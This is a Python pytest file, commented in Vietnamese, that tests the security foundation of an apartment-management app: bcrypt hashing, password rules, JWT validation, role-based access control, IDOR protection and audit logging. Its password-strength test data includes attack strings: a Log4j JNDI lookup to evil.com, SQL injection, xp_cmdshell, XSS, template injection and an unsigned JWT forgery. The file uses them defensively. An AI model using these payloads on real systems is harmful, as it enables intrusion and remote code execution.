"""
Unit & Integration Tests for US-44: Bảo mật & Phân quyền nền tảng (Foundation Security & RBAC).
Black-Box Testing Specification:
- AC-44.1: Mật khẩu bắt buộc được băm bằng bcrypt với salt rounds >= 12.
- AC-44.2: Ngăn chặn IDOR (Insecure Direct Object References) khi cư dân truy cập hộ khác (trả về 404, không trả 403).
- AC-29.1: Chính sách độ mạnh mật khẩu (>= 8 ký tự, có hoa, thường, số).
- AC-31.1: RBAC Middleware kiểm soát quyền truy cập theo vai trò.
- JWT Access Token: Mã hóa, giải mã, hết hạn, từ chối token rác/giả mạo.
- Audit Log: Tự động ghi vết sự kiện ACCESS_DENIED.
"""

from datetime import timedelta
import pytest
from sqlalchemy import select
from app.core.config import settings
from app.core.security import (
    create_access_token,
    decode_access_token,
    get_password_hash,
    validate_password_strength,
    verify_password,
)
from app.models.user import AuditLog


# =====================================================================
# 1. KIỂM THỬ TIÊU CHÍ AC-44.1: BĂM MẬT KHẨU BCRYPT (ROUNDS >= 12)
# =====================================================================

def test_ac44_1_bcrypt_hash_cost_factor_ge_12():
    """
    Kiểm thử AC-44.1: Mật khẩu bắt buộc được băm bằng bcrypt với salt rounds >= 12.
    Định dạng chuỗi bcrypt: $2b$<rounds>$...
    """
    plain_password = "SecretPassword@2026"
    hashed = get_password_hash(plain_password)

    parts = hashed.split("$")
    assert len(parts) >= 4, "Hash bcrypt phải có ít nhất 4 thành phần"
    assert parts[1] in ("2a", "2b", "2y"), f"Thuật toán không phải bcrypt: {parts[1]}"

    rounds = int(parts[2])
    assert rounds >= 12, f"AC-44.1 thất bại: Số rounds ({rounds}) nhỏ hơn 12"

    assert verify_password(plain_password, hashed) is True
    assert verify_password("WrongPassword@2026", hashed) is False


@pytest.mark.parametrize("plain_pwd", [
    "AdminPass123!",
    "AccPass123!",
    "ResPass123!",
    "StrongP@ssw0rd!",
    "V3ry$ecureP@ss",
    "BlueMoon#2026",
    "SuperAdmin2026#",
    "KiemThuPass1",
    "Password123",
    "A1b2C3d4E5f6",
    "1234567aA",
    "P@ssw0rdP@ssw0rdP@ssw0rd",
    "Z9!qWeRtYuI",
    "Abcdefg1",
    "1gfedcbA",
])
def test_bcrypt_hash_and_verify_valid_passwords(plain_pwd):
    """Kiểm thử sinh mã băm bcrypt và xác thực thành công cho nhiều mật khẩu khác nhau."""
    hashed = get_password_hash(plain_pwd)
    assert hashed != plain_pwd
    assert hashed.startswith(("$2a$", "$2b$", "$2y$"))
    assert verify_password(plain_pwd, hashed) is True


@pytest.mark.parametrize("plain_pwd, wrong_pwd", [
    ("AdminPass123!", "adminpass123!"),
    ("AdminPass123!", "AdminPass123"),
    ("AdminPass123!", "AdminPass123! "),
    ("AccPass123!", "accpass123!"),
    ("ResPass123!", "Respass123!"),
    ("StrongP@ssw0rd!", "StrongP@ssw0rd"),
    ("V3ry$ecureP@ss", "v3ry$ecurep@ss"),
    ("BlueMoon#2026", "bluemoon#2026"),
    ("SuperAdmin2026#", "Superadmin2026#"),
    ("Password123", "password123"),
])
def test_bcrypt_verification_wrong_passwords(plain_pwd, wrong_pwd):
    """Kiểm thử xác thực thất bại khi nhập sai mật khẩu (sai hoa thường, ký tự thừa, thiếu)."""
    hashed = get_password_hash(plain_pwd)
    assert verify_password(wrong_pwd, hashed) is False


@pytest.mark.parametrize("corrupted_hash", [
    "",
    "not_a_hash",
    "$2b$12$",
    "$2b$12$invalid_hash_string_here",
    "pbkdf2:sha256:260000$saltsalt$hashhash",
    "md5_3858f62230ac3c915f300c664b2c80a1",
    "sha1_2fd4e1c67a2d28fced849ee1bb76e7391b93eb12",
    "$2b$04$toofewroundstobeacceptablehashsamplevaluehere",
    "null",
    "None",
    "   ",
    "$1$random$hash",
    "argon2id$v=19$m=65536,t=3,p=4$somehash",
    "plain_text_not_hashed",
    "1234567890",
])
def test_bcrypt_verification_malformed_hashes(corrupted_hash):
    """Kiểm thử hàm verify_password xử lý hash rác/hỏng mà không làm sập ứng dụng (trả về False)."""
    assert verify_password("AnyPassword123!", corrupted_hash) is False


# =====================================================================
# 2. KIỂM THỬ CHÍNH SÁCH ĐỘ MẠNH MẬT KHẨU (AC-29.1) — MA TRẬN TOÀN DIỆN
# =====================================================================

@pytest.mark.parametrize("valid_pwd", [
    "AdminPass123!",
    "StrongP@ssw0rd",
    "V3ry$ecureP@ss",
    "BlueMoon#2026",
    "C@nH0_1002_MatKhau",
    "Password123",
    "1234567aA",
    "A1b2C3d4E5f6",
    "P@ssw0rdP@ssw0rdP@ssw0rd",
    "Z9!qWeRtYuI",
    "X1y2Z3_A4b5C6",
    "KiemThuPass1",
    "SuperAdmin2026#",
    "Abcdefg1",
    "1gfedcbA",
    "Complex!Pass8",
    "Str0ng#2026",
    "SecureApp_99",
    "HaNoi_2026_Ok",
    "Bluemoon_Apartment_9",
    "ValidPassw0rd!",
    "MyHome101!",
    "Resident999Pass",
    "Accountant2026!",
    "Testing1234#A",
])
def test_password_strength_valid_passwords(valid_pwd):
    """Kiểm thử các chuỗi mật khẩu hợp lệ (>= 8 ký tự, có hoa, thường, số)."""
    valid, msg = validate_password_strength(valid_pwd)
    assert valid is True
    assert msg == "Hợp lệ"


@pytest.mark.parametrize("short_pwd", [
    "",
    "A",
    "1",
    "a",
    "!",
    "Aa1",
    "Aa1!",
    "A1b2C",
    "Abc12",
    "Abcd12",
    "Abcde12",  # 7 ký tự
    "1234567",  # 7 chữ số
    "AbCdEf1",  # 7 ký tự
    "aA!2345",  # 7 ký tự
    "99999Aa",  # 7 ký tự
])
def test_password_strength_invalid_length(short_pwd):
    """Kiểm thử mật khẩu không đủ độ dài tối thiểu (< 8 ký tự)."""
    valid, msg = validate_password_strength(short_pwd)
    assert valid is False
    assert f"độ dài tối thiểu {settings.MIN_PASSWORD_LENGTH}" in msg


@pytest.mark.parametrize("no_upper", [
    "lowercase123!",
    "adminpass2026",
    "bluemoon_apartment_101",
    "all_lower_no_upper_99",
    "123456789a",
    "mypassword1",
    "supersecure123",
    "testresident2026",
    "!@#$%^&*()1a",
    "hello_world_123",
    "vietnam_2026_test",
    "password_only_lower_0",
    "hanoi_apartment_123",
    "kientruc_software_9",
    "database_sql_101",
])
def test_password_strength_missing_uppercase(no_upper):
    """Kiểm thử mật khẩu thiếu chữ hoa (A-Z)."""
    valid, msg = validate_password_strength(no_upper)
    assert valid is False
    assert "chữ hoa" in msg


@pytest.mark.parametrize("no_lower", [
    "UPPERCASE123!",
    "ADMINPASS2026",
    "BLUEMOON_APARTMENT_101",
    "ALL_UPPER_NO_LOWER_99",
    "123456789A",
    "MYPASSWORD1",
    "SUPERSECURE123",
    "TESTRESIDENT2026",
    "!@#$%^&*()1A",
    "HELLO_WORLD_123",
    "VIETNAM_2026_TEST",
    "PASSWORD_ONLY_UPPER_0",
    "HANOI_APARTMENT_123",
    "KIENTRUC_SOFTWARE_9",
    "DATABASE_SQL_101",
])
def test_password_strength_missing_lowercase(no_lower):
    """Kiểm thử mật khẩu thiếu chữ thường (a-z)."""
    valid, msg = validate_password_strength(no_lower)
    assert valid is False
    assert "chữ thường" in msg


@pytest.mark.parametrize("no_digits", [
    "NoDigitsHere!",
    "AdminPassword",
    "BlueMoonApartment",
    "OnlyLettersUpperLower",
    "Abcdefghijk",
    "SuperSecurePass",
    "VietNamVoDich",
    "UnitTestPassword",
    "!@#$%^&*AbcDef",
    "SecretPassPhrase",
    "HanoiApartmentBuilding",
    "SoftwareEngineeringProject",
    "PythonFastApiFramework",
    "PostgreSqlDatabaseServer",
    "TraceabilityMatrixDocument",
])
def test_password_strength_missing_digits(no_digits):
    """Kiểm thử mật khẩu thiếu chữ số (0-9)."""
    valid, msg = validate_password_strength(no_digits)
    assert valid is False
    assert "chữ số" in msg


@pytest.mark.parametrize("absurd_pwd, expected_valid", [
    ("        ", False),  # 8 spaces -> thiếu hoa, thường, số
    ("   Aa1  ", True),   # 8 ký tự có hoa, thường, số và space
    ("\t\n\rAa1\t\n", True),  # Chứa ký tự điều khiển nhưng đủ điều kiện
    ("A" * 1000 + "a1", True),  # Cực dài (1002 ký tự)
    ("DROP TABLE users;--Aa1", True),  # SQL Injection payload nhưng đủ rule
    ("SELECT * FROM users WHERE 1=1", True),  # Chứa upper, lower và số 1
    ("SELECT * FROM USERS WHERE ID=1", False),  # SQL chỉ có hoa và số, thiếu thường
    ("select * from users where id=1", False),  # SQL chỉ có thường và số, thiếu hoa
    ("SELECT * FROM USERS WHERE USERNAME='ADMIN'", False),  # SQL thiếu số và thường
    ("<script>alert(1)</script>Aa1", True),  # XSS payload nhưng đủ rule
    ("<script>alert(1)</script>", False),  # XSS thiếu hoa
    ("👨‍👩‍👧‍👦Aa12345", True),  # Chứa Emoji kèm Aa1
    ("👨‍👩‍👧‍👦👨‍👩‍👧‍👦👨‍👩‍👧‍👦", False),  # Chỉ Emoji
    ("TiếngViệtCóDấu1Aa", True),  # Ký tự có dấu UTF-8 kèm hoa, thường, số
    ("РусскийЯзык123Aa", True),  # Chữ Cyrillic kèm Aa1
    ("العربية123Aa", True),  # Ký tự Ả Rập kèm Aa1
    ("1234567890!@#$%", False),  # Không có chữ cái
    ("abcdefghijklmn", False),  # Chỉ chữ thường
    ("ABCDEFGHIJKLMN", False),  # Chỉ chữ hoa
    ("aB1" + "\x00" * 10, True),  # Chứa byte NULL nhưng đủ điều kiện
    ("${jndi:ldap://evil.com/a}Aa1", True),  # Log4j payload đủ rule
    ("{{7*7}}SSTI_Aa1", True),  # Template injection payload đủ rule
    ("a" * 7 + "A", False),  # Thiếu số
    ("1" * 7 + "a", False),  # Thiếu hoa
    ("A" * 7 + "1", False),  # Thiếu thường
    ("Aa" + "1" * 5, False),  # 7 ký tự -> thiếu độ dài
    ("Aa" + "1" * 6, True),   # 8 ký tự -> hợp lệ biên
    ("パスワード123Aa", True),  # Chữ Nhật kèm Aa123
    ("🔑🔒🗝️Pass123", True),  # Key emoji kèm Pass123
    ("'; EXEC xp_cmdshell('dir');--", False),  # Thiếu số
    ("'; EXEC xp_cmdshell('dir1');--", True),  # Có hoa, thường, số
    ("ADMIN_PASSWORD_12345", False),  # Thiếu thường
    ("admin_password_12345", False),  # Thiếu hoa
])
def test_password_strength_absurd_and_extreme_inputs(absurd_pwd, expected_valid):
    """Kiểm thử các chuỗi mật khẩu dị biệt, payload tấn công, Unicode và biên cực hạn."""
    valid, _ = validate_password_strength(absurd_pwd)
    assert valid is expected_valid


# =====================================================================
# 3. KIỂM THỬ JWT ACCESS TOKEN — AN TOÀN, BIÊN & TẤN CÔNG GIẢ MẠO
# =====================================================================

def test_jwt_token_creation_and_decoding():
    """Kiểm thử sinh và giải mã JWT token kèm theo đầy đủ claims."""
    payload_data = {
        "sub": "100",
        "username": "test_user",
        "role": "ACCOUNTANT",
        "household_id": 50,
        "must_change_password": False
    }
    token = create_access_token(payload_data, expires_delta=timedelta(minutes=30))
    decoded = decode_access_token(token)

    assert decoded["sub"] == "100"
    assert decoded["username"] == "test_user"
    assert decoded["role"] == "ACCOUNTANT"
    assert decoded["household_id"] == 50
    assert decoded["must_change_password"] is False
    assert "exp" in decoded
    assert "iat" in decoded


def test_jwt_token_custom_expiration():
    """Kiểm thử thời gian hết hạn (exp) phản ánh đúng tham số expires_delta."""
    payload_data = {"sub": "1", "username": "admin_test", "role": "ADMIN"}
    token = create_access_token(payload_data, expires_delta=timedelta(hours=2))
    decoded = decode_access_token(token)
    assert decoded["exp"] - decoded["iat"] == 7200


def test_jwt_token_expired():
    """Kiểm thử từ chối token khi đã hết hạn."""
    payload_data = {"sub": "1", "username": "expired_user", "role": "ADMIN"}
    token = create_access_token(payload_data, expires_delta=timedelta(seconds=-10))

    with pytest.raises(Exception):
        decode_access_token(token)


@pytest.mark.parametrize("invalid_token", [
    "",
    "   ",
    "not.a.token",
    "abc.def",
    "header.payload",
    "ey.ey.ey.ey",
    "Bearer eyJhbGciOiJIUzI1NiJ9.e30.signature",
    "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIn0.",  # None algorithm attack
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalidbase64!@#.signature",
    "null",
    "None",
    "123456",
    "{}",
    "[]",
    "a" * 500,
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0.invalidsignature123",
    "eyJhbGciOiJIUzI1NiJ9.invalidpayload",
    "\x00\x01\x02\x03",
    "jwt.with.four.sections.here",
    "Bearer ",
])
def test_jwt_decode_malformed_and_tampered_tokens(invalid_token):
    """Kiểm thử từ chối mọi chuỗi token rác, sai format hoặc cố tình giả mạo."""
    with pytest.raises(Exception):
        decode_access_token(invalid_token)


# =====================================================================
# 4. KIỂM THỬ PHÂN QUYỀN RBAC GUARD (US-31, AC-31.1) VỚI CÁC VAI TRÒ
# =====================================================================

@pytest.mark.parametrize("role_code, user_id, expected_status", [
    ("ADMIN", 1, 200),
    ("ACCOUNTANT", 2, 403),
    ("RESIDENT", 3, 403),
    ("RESIDENT", 4, 403),
])
def test_rbac_guard_role_access_matrix(client, role_code, user_id, expected_status):
    """Kiểm thử ma trận RBAC: Chỉ duy nhất ADMIN được truy cập /test/admin-only."""
    token = create_access_token({"sub": str(user_id), "username": f"user_{role_code}", "role": role_code})
    response = client.get("/api/v1/test/admin-only", headers={"Authorization": f"Bearer {token}"})
    assert response.status_code == expected_status
    if expected_status == 403:
        assert response.json()["code"] == "FORBIDDEN"


@pytest.mark.parametrize("user_id, role_code", [
    (99, "TREASURER"),
    (100, "GUEST"),
    (101, "SUPERUSER"),
    (9999, "ADMIN"),
    (-1, "ADMIN"),
])
def test_rbac_guard_nonexistent_user_rejected(client, user_id, role_code):
    """Kiểm thử token chứa user ID không tồn tại trong database bị từ chối 401 UNAUTHENTICATED."""
    token = create_access_token({"sub": str(user_id), "username": f"user_{user_id}", "role": role_code})
    response = client.get("/api/v1/test/admin-only", headers={"Authorization": f"Bearer {token}"})
    assert response.status_code == 401
    assert response.json()["code"] == "UNAUTHENTICATED"


@pytest.mark.parametrize("header_value", [
    "",
    "Bearer",
    "Bearer ",
    "Bearer   ",
    "bearer ",
    "Basic YWRtaW46cGFzcw==",
    "Token 12345",
    "JWT 12345",
    "Bearer invalid_token_123",
    "Bearer eyJhbGciOiJIUzI1NiJ9",
    "CustomAuth token",
    "Bearer null",
    "Bearer 123456",
    "Bearer undefined",
    "Digest username=admin",
])
def test_rbac_guard_malformed_auth_headers(client, header_value):
    """Kiểm thử header Authorization chứa các giá trị sai chuẩn bị từ chối 401."""
    headers = {"Authorization": header_value} if header_value else {}
    response = client.get("/api/v1/test/admin-only", headers=headers)
    assert response.status_code == 401
    assert response.json()["code"] == "UNAUTHENTICATED"


def test_rbac_guard_audit_log_recorded_on_access_denied(client, auth_headers_resident_101, db_session):
    """Ghi nhận nhật ký ACCESS_DENIED vào audit_logs khi vi phạm quyền RBAC."""
    res = client.get("/api/v1/test/admin-only", headers=auth_headers_resident_101)
    assert res.status_code == 403

    stmt = select(AuditLog).where(
        AuditLog.action == "ACCESS_DENIED",
        AuditLog.user_id == 3
    )
    log = db_session.scalars(stmt).first()
    assert log is not None
    assert log.entity_type == "ENDPOINT"
    assert "không có quyền" in log.reason


# =====================================================================
# 5. KIỂM THỬ TIÊU CHÍ AC-44.2: CHỐNG LỖ HỔNG IDOR TRUY CẬP CHÉO HỘ
# =====================================================================

@pytest.mark.parametrize("requested_household_id, expected_status, expected_code", [
    (101, 200, None),          # Chính chủ hộ 101 -> Hợp lệ
    (102, 404, "NOT_FOUND"),    # Hộ khác 102 -> 404 (chống IDOR)
    (103, 404, "NOT_FOUND"),    # Hộ khác 103 -> 404
    (0, 404, "NOT_FOUND"),      # Hộ ID = 0 -> 404
    (-1, 404, "NOT_FOUND"),     # Hộ ID âm -> 404
    (-999, 404, "NOT_FOUND"),   # Hộ ID âm lớn -> 404
    (999999, 404, "NOT_FOUND"), # Hộ cực lớn không tồn tại -> 404
    (1, 404, "NOT_FOUND"),      # Hộ 1 -> 404
    (200, 404, "NOT_FOUND"),    # Hộ 200 -> 404
    (100, 404, "NOT_FOUND"),    # Hộ 100 -> 404
])
def test_ac44_2_idor_defense_matrix_resident_101(
    client,
    auth_headers_resident_101,
    requested_household_id,
    expected_status,
    expected_code
):
    """Kiểm thử toàn diện chống rò rỉ IDOR cho cư dân hộ 101: Luôn trả 404 cho các hộ không phải của mình."""
    response = client.get(
        f"/api/v1/test/households/{requested_household_id}",
        headers=auth_headers_resident_101
    )
    assert response.status_code == expected_status
    if expected_code:
        assert response.json()["code"] == expected_code


@pytest.mark.parametrize("requested_household_id, expected_status, expected_code", [
    (102, 200, None),          # Chính chủ hộ 102 -> Hợp lệ
    (101, 404, "NOT_FOUND"),    # Hộ khác 101 -> 404
    (103, 404, "NOT_FOUND"),    # Hộ khác 103 -> 404
    (0, 404, "NOT_FOUND"),      # Hộ ID = 0 -> 404
    (999999, 404, "NOT_FOUND"), # Hộ không tồn tại -> 404
])
def test_ac44_2_idor_defense_matrix_resident_102(
    client,
    auth_headers_resident_102,
    requested_household_id,
    expected_status,
    expected_code
):
    """Kiểm thử toàn diện chống rò rỉ IDOR cho cư dân hộ 102: Chỉ được xem hộ 102."""
    response = client.get(
        f"/api/v1/test/households/{requested_household_id}",
        headers=auth_headers_resident_102
    )
    assert response.status_code == expected_status
    if expected_code:
        assert response.json()["code"] == expected_code


@pytest.mark.parametrize("household_id", [101, 102, 103, 200, 999])
def test_admin_bypass_household_restriction(client, auth_headers_admin, household_id):
    """Admin được phép xem thông tin bất kỳ hộ nào mà không bị áp dụng giới hạn IDOR."""
    res = client.get(f"/api/v1/test/households/{household_id}", headers=auth_headers_admin)
    assert res.status_code == 200


@pytest.mark.parametrize("household_id", [101, 102, 0, 999, -1])
def test_idor_unauthenticated_requests(client, household_id):
    """Yêu cầu truy cập tài nguyên hộ gia đình khi chưa đăng nhập bị từ chối 401 UNAUTHENTICATED."""
    res = client.get(f"/api/v1/test/households/{household_id}")
    assert res.status_code == 401
    assert res.json()["code"] == "UNAUTHENTICATED"


# =====================================================================
# 6. KIỂM THỬ CHUẨN XỬ LÝ LỖI & SỨC KHỎE HỆ THỐNG
# =====================================================================

def test_health_check_endpoint(client):
    """Kiểm thử GET /api/v1/health hoạt động và trả về cấu trúc chuẩn."""
    response = client.get("/api/v1/health")
    assert response.status_code == 200
    data = response.json()
    assert data["status"] == "ok"
    assert "BlueMoon" in data["app"]


@pytest.mark.parametrize("non_existent_path", [
    "/api/v1/ghost-route",
    "/api/v1/unknown-endpoint",
    "/api/v1/households/not-a-path",
    "/api/v1/auth/non-existent-action",
    "/api/v1/api/v1/health",
])
def test_error_envelope_404_not_found(client, non_existent_path):
    """Kiểm thử Error Envelope cho các endpoint không tồn tại (404 NOT_FOUND)."""
    response = client.get(non_existent_path)
    assert response.status_code == 404
    data = response.json()
    assert data["code"] == "NOT_FOUND"
    assert "message" in data
    assert isinstance(data.get("details"), list)
